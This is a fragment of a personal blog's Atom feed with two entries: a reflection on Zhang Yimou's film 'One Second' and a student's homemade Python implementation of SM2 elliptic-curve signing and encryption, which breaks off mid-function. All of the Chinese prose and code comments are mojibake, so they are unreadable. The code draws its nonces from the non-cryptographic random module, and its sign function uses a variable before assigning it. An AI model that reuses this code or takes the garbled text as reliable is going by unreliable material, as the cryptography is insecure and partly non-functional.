    <content type="html"><![CDATA[<p>å½±è§†é‰´èµçš„æœ€åä¸€èŠ‚è¯¾ï¼Œè€å¸ˆç»™æ”¾äº†å¼ è‰ºè°‹å¯¼æ¼”çš„ä¸€ç§’é’Ÿï¼Œç”±äºè¿™æ¬¡ä¸å†å¸ƒç½®ä½œä¸šï¼Œä¹Ÿæ²¡æœ‰å½“ä½œè€ƒè¯•ï¼Œæ‰€ä»¥å°±è‡ªå·±è®°å½•ä¸€ä¸‹è§‚åæ„Ÿå§ï¼Œæ˜¯ä¸€éƒ¨å¾ˆä¼˜ç§€çš„ä½œå“ï¼Œå†…å®¹ä¹Ÿå¾ˆä¸°å¯Œï¼Œå›å»åå‡­ç€è®°å¿†éšä¾¿è®°ç‚¹ä¸œè¥¿<br><span id="more"></span></p><p>ã€Šä¸€ç§’é’Ÿã€‹æ˜¯å¼ è‰ºè°‹æœ¬äººæ‹æ‘„çš„ç”µå½±ï¼Œå¹¶ä¸”ä»–å…¨ç¨‹ä½¿ç”¨èƒ¶ç‰‡æ‹æ‘„ï¼Œè¡¨è¾¾äº†ä»–åœ¨è¿™ä¸ªæ•°å­—åŒ–æ—¶ä»£å¯¹èƒ¶ç‰‡çš„çƒ­çˆ±å’ŒåšæŒã€‚ç”µå½±çš„èƒŒæ™¯æ˜¯æ–‡é©æ—¶ä»£çš„å¤§è¥¿åŒ—ï¼Œæ•´ä¸ªç”µå½±ç»™äº†èŒ«èŒ«é»„åœŸå¤§é‡çš„é•œå¤´ï¼Œå±•ç¤ºè¿™ç§è‡ªç„¶æ™¯è§‚ã€‚ç”µå½±é€šè¿‡çœ‹ç”µå½±å±•å¼€ï¼ˆå¥—å¨ƒï¼Œæœ‰æ„æ€çš„æ˜¯é‡Œé¢çš„ç”µå½±ä¹Ÿæ˜¯ç”¨èƒ¶ç‰‡æ’­æ”¾çš„ï¼Œæœ‰ä¸€æ®µå‰§æƒ…æ˜¯èƒ¶ç‰‡è¢«ç ´ååï¼Œäººä»¬ç”¨å¸ƒå°†èƒ¶ç‰‡æŠ¬èµ·æ¥ï¼Œå°±åƒæŠ¬æ£ºä¸€æ ·ï¼Œè¿™ä¹Ÿä»¿ä½›æ˜¯èƒ¶ç‰‡ç”µå½±çš„ç»“å±€ï¼›è€Œå¥³ä¸»æ‰€å”±çš„edï¼Œæ­Œè¯ä¹Ÿæ˜¯åœ¨æ˜ å°„èƒ¶ç‰‡ï¼Œå¯ä»¥ç†è§£æˆèƒ¶ç‰‡çš„æŒ½æ­Œã€‚ç”µå½±é‡Œè¿˜ç»™äº†èƒ¶ç‰‡å¾ˆå¤šç‰¹å†™ï¼Œå¯ä»¥çœ‹å‡ºå¼ è‰ºè°‹çœŸçš„å¾ˆå–œæ¬¢èƒ¶ç‰‡ã€‚å¯æƒœï¼Œæ•°å­—åŒ–æ˜¯æ—¶ä»£çš„æ½®æµï¼Œä»»ä½•äº‹ç‰©ã€ç”šè‡³æ˜¯é˜¶çº§ã€å›½å®¶ï¼Œéƒ½æŒ¡ä¸ä½æ—¶ä»£æ½®æµã€‚</p><p>ç”µå½±é‡Œæœ€æ ¸å¿ƒçš„è¿˜æ˜¯ç”·å¥³ä¸»ï¼Œç”·ä¸»æ˜¯ä¸€ååŠ³æ”¹çŠ¯ï¼Œä»åŠ³æ”¹å†œåœºé€ƒå‡ºæ¥çœ‹ç”µå½±åªä¸ºè§è‡ªå·±çš„å¥³å„¿ï¼Œå°½ç®¡åœ¨å½±ç‰‡ä¸­åªå‡ºç°äº†â€œä¸€ç§’é’Ÿâ€ï¼Œè¿™ä¹Ÿæ˜¯æ ‡é¢˜çš„æ¥æºï¼›å¥³ä¸»å’Œå¥¹çš„å¼Ÿå¼Ÿæ˜¯å­¤å„¿ï¼Œæ‰€ä»¥èµ·åä¹Ÿå¾ˆç®€å•ï¼Œä¸ºäº†å·èƒ¶ç‰‡æ¥èµ”å¿åˆ«äººçš„â€œèƒ¶ç‰‡ç¯ç½©â€ï¼Œè™½ç„¶å¥¹çš„çˆ¶äº²å¯¹å§å¼Ÿä¿©å¾ˆå·®ï¼Œå¹¶ä¸”æ®å¥¹æœ¬äººè¯´â€œæ—©å°±æ­»äº†â€ï¼Œä½†å¥¹ä»ç„¶å¾ˆæƒ³å¿µè‡ªå·±çš„çˆ¶äº²ï¼Œæ¸´æœ›çˆ¶çˆ±ã€‚äºæ˜¯ï¼Œç”·ä¸»å¯»æ‰¾å¥³å„¿ï¼Œå¥³ä¸»å¯»æ‰¾çˆ¶äº²ï¼Œè¿™ä¸€å¯¹å·§åˆå°±è¿™æ ·ç¢°æ’åœ¨ä¸€èµ·äº†ã€‚åœ¨ç”µå½±æœ€åï¼Œæ–‡é©ç»“æŸé«˜è€ƒæ¢å¤ï¼Œç”·ä¸»ä¹Ÿè¢«åŠ³æ”¹æ‰€æ”¾å‡ºæ¥ï¼Œäºæ˜¯ä»–æ¥åˆ°äºŒåœºï¼ˆçœ‹ç”µå½±çš„åœ°æ–¹ä¹‹ä¸€ï¼‰ï¼›å¥³ä¸»ä¹Ÿé•¿å¤§æˆäººï¼Œä»ä¸€ä¸ªä¸è°™ä¸–äº‹çš„å¥³å­©è½¬å˜ä¸ºæˆç†Ÿçš„å¤§äººï¼Œä»–ä»¬äºŒäººä¸€èµ·å»æ²™æ¼ é‡Œå¯»æ‰¾ä¹‹å‰è¢«ä¸¢å¼ƒçš„ç”·ä¸»å¥³å„¿çš„èƒ¶ç‰‡ï¼Œç”µå½±ç»“æŸã€‚</p><p>åœ¨æ•´ä¸ªæ•…äº‹ä¸­ï¼Œå¯ä»¥çœ‹å‡ºç”·ä¸»æ˜¯ä¸€ä¸ªä¸å–„è¨€è¾çš„äººï¼Œæ˜“æ€’ã€å¥½æ–—ï¼Œæ‰€ä»¥åœ¨å½“æ—¶é‚£ä¸ªæ—¶ä»£è¢«äººé™·å®³ï¼Œä»…å› æ‰“æ¶åŠ³æ”¹å¤šå¹´ï¼Œä¹Ÿå› æ­¤å¦»ç¦»å­æ•£ï¼Œæ— æ³•ä¸ä»–çš„å¥³å„¿ç›¸è§ã€‚å°½ç®¡å¥³ä¸»åå¤å·çªƒèƒ¶ç‰‡ï¼Œä½†å¥¹ç¡®å®ä¸æ˜¯åäººâ€”â€”å› ä¸ºå¼Ÿå¼Ÿå¼„åäº†åˆ«äººçš„èƒ¶ç‰‡å°ç¯ï¼Œåˆå› ä¸ºèƒ¶ç‰‡æ˜¯ä¹°ä¸åˆ°çš„ï¼Œåªèƒ½å»å·ï¼Œè€Œå¼Ÿå¼Ÿä¹Ÿå› ä¸ºé‚»å±…å°å­©çš„æ¬ºå‡Œä¸æ•¢å‡ºé—¨ã€‚åœ¨è¿™æ ·ä¸€ä¸ªæ•æ„Ÿçš„æ—¶ä»£ï¼Œä»¿ä½›æ¯ä¸ªäººçš„é­é‡éƒ½å……æ»¡äº†ä¸å¹¸ï¼Œä½†æ˜¯ä»æ•´ä½“ä¸Šæ¥çœ‹ï¼Œåˆå……æ»¡äº†å¸Œæœ›ã€‚æ”¾æ˜ å‘˜å·å¬å¤§å®¶ä¸€èµ·æ¸…æ´—èƒ¶ç‰‡æ—¶ï¼Œæ¯ä¸ªäººéƒ½å……æ»¡äº†å¹²åŠ²ï¼Œä»¥æ­¤ä¸ºå·±ä»»ï¼Œå…¨ç„¶ä½“ç°é›†ä½“ä¸»ä¹‰çš„ç¾å¥½ã€‚ã€Šä¸‰ä½“1ã€‹ä¸­ï¼Œå¶æ–‡æ´çš„å®¶åº­å› æ‰¹æ–—é­é‡ä¸å¹¸ï¼Œä½†å¥¹ä½åœ¨ä¸œåŒ—ä¹¡æ‘çš„é‚£æ®µæ—¶é—´å…¨ç„¶å¿˜è®°äº†ç”Ÿæ´»çš„è‹¦é—·ã€‚å°½ç®¡å¦‚æ­¤ï¼Œä¿¡å·å·²ç»å‘å‡ºï¼Œè¿‡å»çš„äº‹å·²æ— æ³•æŒ½å›ã€‚æˆ–è®¸ï¼Œè¿™ä¾¿æ˜¯æ—¶ä»£çš„æ‚²å“€å§ã€‚</p><p>ç”µå½±é‡Œè¿˜æœ‰ä¸€ä½åˆ»ç”»çš„éå¸¸é¥±æ»¡çš„äººç‰©ï¼Œå°±æ˜¯æ”¾æ˜ å‘˜ã€‚åœ¨ä»–çš„è¡Œä¸ºä¸¾æ­¢ä¸­ï¼Œå¾ˆèƒ½çœ‹å‡ºé‚£ä¸ªæ—¶ä»£é‡Œå°äººç‰©çš„æ‚²å‰§ã€‚å¯¹æ‘æ°‘æ¥è¯´ï¼Œä»–æ˜¯é«˜é«˜åœ¨ä¸Šçš„æ”¾æ˜ å‘˜ï¼Œè¡¨é¢ä¸Šå‘¼é£å”¤é›¨ï¼›ä½œä¸ºå°é¢†å¯¼ï¼Œä»–å®³æ€•è‡ªå·±çš„èŒä½è¢«ä»–äººï¼Œä¸æ–­è´¬ä½æƒ³è¦æ¥æ›¿ä»–ä½ç½®çš„äººï¼›åŒæ—¶ï¼Œä»–å¯¹ä¿å«ç§‘çš„å¤´å´ç‚¹å¤´å“ˆè…°ï¼ˆä¸ªäººç†è§£ä¿å«ç§‘çš„å¤´å®˜ä½æ¯”ä»–å¤§ï¼‰ï¼Œåœ¨ä»–å«ä¿å«ç§‘å»æŠ“æ•ç”·ä¸»æ—¶ä¸å¿˜ç¥ˆæ±‚å¯¹æ–¹ä¸ºè‡ªå·±è®°ä¸Šä¸€åŠŸã€‚åŒæ—¶ï¼Œå¾—çŸ¥ç”·ä¸»æ˜¯åŠ³æ”¹çŠ¯èº«ä»½çš„å‰åï¼Œä»–çš„æ€åº¦å¤§ç›¸å¾„åº­ï¼›è€Œä»å¦ä¸€æ–¹é¢ï¼Œä»–å¯¹è‡ªå·±çš„å·¥ä½œéå¸¸è´Ÿè´£ï¼Œæ‡‚å¾—å„ç§æŠ€å·§ï¼Œæ‰€è°“â€œå››ä¸ªåœºå”¯ç‹¬ä»–ä¼šæ‹‰é•¿èƒ¶ç‰‡â€ï¼›æœ€åï¼Œè¿™æ ·ä¸€ä½å‘¼é£å”¤é›¨çš„å¤§äººç‰©ï¼Œå´ä¹Ÿæœ‰è‡ªå·±çš„ä¸å¹¸ï¼šä¹‹æ‰€ä»¥ä»–çš„å„¿å­ä¸æ˜¯æ¥ç­äººï¼Œå› ä¸ºä»–å„¿å­å°æ—¶é”™å°†èƒ¶ç‰‡çš„æ¸…æ´—æ¶²å½“æ°´å–ä¸‹ï¼Œè€Œä»–å› ç–å¿½ä½¿å„¿å­çƒ§åäº†è„‘å­ï¼Œåªèƒ½æ”¾ç‰›ã€‚è€Œåœ¨æ­å‘äº†ç”·ä¸»åï¼Œä»–ä¸ºä¿å«ç§‘æ®´æ‰“äº†ä»–æ„Ÿåˆ°è‡ªè´£ï¼Œäºæ˜¯å°†ä»–å¥³å„¿çš„é‚£ä¸¤ç¯‡èƒ¶å¸¦é€ç»™äº†ä»–ï¼Œç”·ä¸»ä¹Ÿè¯·æ±‚ä»–æŠŠé‚£ä¸ªèƒ¶ç‰‡ç¯ç½©é€ç»™å¥³ä¸»ï¼Œä»åæ¥å¯ä»¥çœ‹åˆ°ä»–ç¡®å®è¿™ä¹ˆåšã€‚1ä¸ªäººè®¤ä¸ºè¿™ä¸ªè§’è‰²æ˜¯åˆ»ç”»çš„æœ€ç»†è…»çš„ä¸€ä½ã€‚</p><p>æœ€åè¿™æ®µä¹Ÿåæ˜ äº†å½“æ—¶å¯¹äººæƒçš„æ¼ è§†ã€‚ç”·ä¸»åœ¨è¢«ä¿å«ç§‘æŠ“èµ°åï¼Œä»–ä»¬æŠ¢èµ°äº†ç”·ä¸»å¥³å„¿çš„èƒ¶ç‰‡ï¼Œè¿˜æ‰”æ‰äº†ã€‚é¢å¯¹ç”·ä¸»æ’•å¿ƒçš„å‘¼å–Šï¼Œä»–ä»¬åšçš„å´åªæ˜¯å˜²ç¬‘ã€‚</p><p>ç”µå½±è¿˜æœ‰å¾ˆå¤šä¸°å¯Œçš„å†…å®¹ï¼Œä½†æ˜¯ä¿ºå¯èƒ½ç»™å¿˜äº†qwqï¼Œå°±åˆ°æ­¤ä¸ºæ­¢å§ã€‚è¿™é—¨è¯¾ç¡®å®æ•™ç»™äº†æˆ‘å¾ˆå¤šï¼Œæœ‰æœºä¼šçš„è¯è¿˜æƒ³å†å­¦ä¸€äº›çœ‹ç”µå½±çš„æ–¹æ³•è®ºã€‚å…¶å®è‡ªå·±ä¹ŸçŸ¥é“è¿™æ˜¯å‡çš„ï¼Œè¿™è¾ˆå­å¤§æ¦‚æ˜¯å†ä¹Ÿä¸ä¼šå»å­¦äº†ï¼Œè¿™å°±åƒå»å¹´çš„ä¸­åæ–‡åŒ–ä¸€èˆ¬ï¼Œå°½ç®¡æˆ‘çŸ¥é“è‡ªå·±å†ä¹Ÿä¸ä¼šå»çœ‹äº†ï¼Œä½†è¿˜æ˜¯æƒ³è®°å½•ä¸‹ç°åœ¨çš„æ„Ÿæƒ³ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å½±è§†é‰´èµçš„æœ€åä¸€èŠ‚è¯¾ï¼Œè€å¸ˆç»™æ”¾äº†å¼ è‰ºè°‹å¯¼æ¼”çš„ä¸€ç§’é’Ÿï¼Œç”±äºè¿™æ¬¡ä¸å†å¸ƒç½®ä½œä¸šï¼Œä¹Ÿæ²¡æœ‰å½“ä½œè€ƒè¯•ï¼Œæ‰€ä»¥å°±è‡ªå·±è®°å½•ä¸€ä¸‹è§‚åæ„Ÿå§ï¼Œæ˜¯ä¸€éƒ¨å¾ˆä¼˜ç§€çš„ä½œå“ï¼Œå†…å®¹ä¹Ÿå¾ˆä¸°å¯Œï¼Œå›å»åå‡­ç€è®°å¿†éšä¾¿è®°ç‚¹ä¸œè¥¿&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="movie" scheme="http://sh1k4ku.github.io/categories/movie/"/>
    
    
  </entry>
  
  <entry>
    <title>SM2</title>
    <link href="http://sh1k4ku.github.io/2022/03/14/2022/SM2/"/>
    <id>http://sh1k4ku.github.io/2022/03/14/2022/SM2/</id>
    <published>2022-03-14T07:03:44.000Z</published>
    <updated>2022-03-14T07:06:04.555Z</updated>
    
    <content type="html"><![CDATA[<p>å¤§åˆ›æ’¸äº†ä¸ªsm2ï¼ˆæ°´ä¸€ä¸‹åšå®¢</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> sm3, key</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line">random_hex = <span class="keyword">lambda</span> x: <span class="string">&#x27;&#x27;</span>.join([choice(<span class="string">&#x27;0123456789abcdef&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(x)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#é»˜è®¤çš„ECCå‚æ•°</span></span><br><span class="line">default_ecc_paras = &#123;</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span> :  <span class="number">0x8542D69E4C044F18E8B92435BF6FF7DE457283915C45517D722EDB8B08F1DFC3</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> :  <span class="number">0x787968B4FA32C3FD2417842E73BBFEFF2F3C848B6831D7E0EC65228B3937E498</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span> :  <span class="number">0x63E4C6D3B23B0C849CF84241484BFE48F61D59A5B16BA06E6E12D1DA27C5249A</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span> : (<span class="number">0x421DEBD61B62EAB6746434EBC3CC315E32220B3BADD50BDC4C4E6C147FEDD43D</span>,</span><br><span class="line">           <span class="number">0x0680512BCBB42C07D47349D2153B70C4E5D7FDFCBFA36EA1A85841B9E46E09A2</span>),</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span> :  <span class="number">0x8542D69E4C044F18E8B92435BF6FF7DD297720630485628D5AE74EE7C32E79B7</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#æ›²çº¿çš„é›¶ç‚¹</span></span><br><span class="line">zero_point = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SM2</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, private_key, public_key, ecc_paras = default_ecc_paras</span>):</span></span><br><span class="line">        self.private_key = private_key</span><br><span class="line">        self.public_key = public_key</span><br><span class="line">        self.ecc_paras = ecc_paras</span><br><span class="line">        self.para_len = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_point</span>(<span class="params">self, P1, P2</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> P1 == zero_point:</span><br><span class="line">            <span class="keyword">return</span> P2</span><br><span class="line">        <span class="keyword">if</span> P2 == zero_point:</span><br><span class="line">            <span class="keyword">return</span> P1</span><br><span class="line"></span><br><span class="line">        (p1x, p1y), (p2x, p2y) = P1, P2</span><br><span class="line">        <span class="keyword">if</span> p1x == p2x <span class="keyword">and</span> (p1y != p2y <span class="keyword">or</span> p1y == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> zero_point</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#è®¡ç®—æ–œç‡</span></span><br><span class="line">        <span class="keyword">if</span> p1x == p2x:</span><br><span class="line">            lam = (<span class="number">3</span> * p1x * p1x + self.ecc_paras[<span class="string">&#x27;a&#x27;</span>]) * invert(<span class="number">2</span> * p1y , self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lam = (p2y - p1y) * invert(p2x - p1x , self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        x = (lam**<span class="number">2</span> - p1x - p2x) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        y = (lam * (p1x - x) - p1y) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">int</span>(x),<span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_kg</span>(<span class="params">self, k, P</span>):</span></span><br><span class="line">        tmp = zero_point</span><br><span class="line">        <span class="keyword">while</span>(k):</span><br><span class="line">            <span class="keyword">if</span>(k &amp; <span class="number">1</span>):</span><br><span class="line">                tmp = self.add_point(tmp, P)</span><br><span class="line">            P = self.add_point(P, P)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len <span class="comment">#æ ¼å¼åŒ–åæ ‡</span></span><br><span class="line">        form = form * <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> form % (tmp[<span class="number">0</span>], tmp[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">self, data</span>):</span> </span><br><span class="line">        <span class="comment">#dataï¼šå¾…ç­¾åçš„ä¿¡æ¯ï¼Œprivate_key:ç§é’¥</span></span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> s == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">while</span> r == <span class="number">0</span> <span class="keyword">or</span> r + k == self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]:</span><br><span class="line">                k = <span class="built_in">int</span>(random_hex(self.para_len), <span class="number">16</span>)</span><br><span class="line">                xy = self.get_kg(k, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">                x = <span class="built_in">int</span>(xy[:self.para_len], <span class="number">16</span>)</span><br><span class="line">                y = <span class="built_in">int</span>(xy[self.para_len:], <span class="number">16</span>)</span><br><span class="line">                r = (e + x) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">            s = (k - r * self.private_key) * invert(self.private_key + <span class="number">1</span>, self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (r, s)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">self, sign, data</span>):</span></span><br><span class="line">        <span class="comment">#sign = (r, s), dataï¼šè¢«ç­¾åçš„ä¿¡æ¯ï¼Œpublic_keyï¼šå…¬é’¥</span></span><br><span class="line">        r = <span class="built_in">int</span>(sign[:self.para_len], <span class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(sign[self.para_len:], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">assert</span> r &gt;= <span class="number">1</span> <span class="keyword">and</span> r &lt;= self.ecc_paras[<span class="string">&#x27;n&#x27;</span>] - <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> s &gt;= <span class="number">1</span> <span class="keyword">and</span> s &lt;= self.ecc_paras[<span class="string">&#x27;n&#x27;</span>] - <span class="number">1</span></span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;éªŒè¯å¤±è´¥ï¼&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        P1 = self.get_kg(s, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">        P2 = self.get_kg(t, self.public_key)</span><br><span class="line">        </span><br><span class="line">        x, y = self.add_point((<span class="built_in">int</span>(P1[:self.para_len], <span class="number">16</span>),<span class="built_in">int</span>(P1[self.para_len:], <span class="number">16</span>)), </span><br><span class="line">                              (<span class="built_in">int</span>(P2[:self.para_len], <span class="number">16</span>),<span class="built_in">int</span>(P2[self.para_len:], <span class="number">16</span>)))</span><br><span class="line">        R = (e + x) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> R == r</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment">#åŠ å¯†</span></span><br><span class="line">        msg = data.<span class="built_in">hex</span>()</span><br><span class="line">        k = <span class="built_in">int</span>(random_hex(self.para_len),<span class="number">16</span>)</span><br><span class="line">        C1 = self.get_kg(k, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">        xy = self.get_kg(k, self.public_key)</span><br><span class="line">        x2 = xy[<span class="number">0</span>:self.para_len]</span><br><span class="line">        y2 = xy[self.para_len:<span class="number">2</span>*self.para_len]</span><br><span class="line">        mlen = <span class="built_in">len</span>(msg)</span><br><span class="line">        t = sm3.sm3_kdf(xy, mlen/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(t, <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % mlen</span><br><span class="line">        C2 = form % (<span class="built_in">int</span>(msg, <span class="number">16</span>) ^ <span class="built_in">int</span>(t, <span class="number">16</span>))</span><br><span class="line">        C3 = sm3.sm3_hash([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span> % (x2, msg, y2))])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span> % (C1, C3, C2))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment">#è§£å¯†</span></span><br><span class="line">        data = data.<span class="built_in">hex</span>()</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        len_3 = len_2 + <span class="number">64</span></span><br><span class="line">        C1 = data[<span class="number">0</span>:len_2]</span><br><span class="line">        C1x = <span class="built_in">int</span>(C1[:self.para_len],<span class="number">16</span>)</span><br><span class="line">        C1y = <span class="built_in">int</span>(C1[self.para_len:],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">assert</span> C1y**<span class="number">2</span> % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>] == (C1x**<span class="number">3</span> + self.ecc_paras[<span class="string">&#x27;a&#x27;</span>] * C1x + self.ecc_paras[<span class="string">&#x27;b&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        C3 = data[len_2:len_3]</span><br><span class="line">        C2 = data[len_3:]</span><br><span class="line">        xy = self.get_kg(self.private_key,(C1x, C1y))</span><br><span class="line">        x2 = xy[<span class="number">0</span>:self.para_len]</span><br><span class="line">        y2 = xy[self.para_len:len_2]</span><br><span class="line">        cl = <span class="built_in">len</span>(C2)</span><br><span class="line">        t = sm3.sm3_kdf(xy, cl/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(t, <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % cl</span><br><span class="line">        M = form % (<span class="built_in">int</span>(C2,<span class="number">16</span>) ^ <span class="built_in">int</span>(t,<span class="number">16</span>))</span><br><span class="line">        u = sm3.sm3_hash([i <span class="keyword">for</span> i 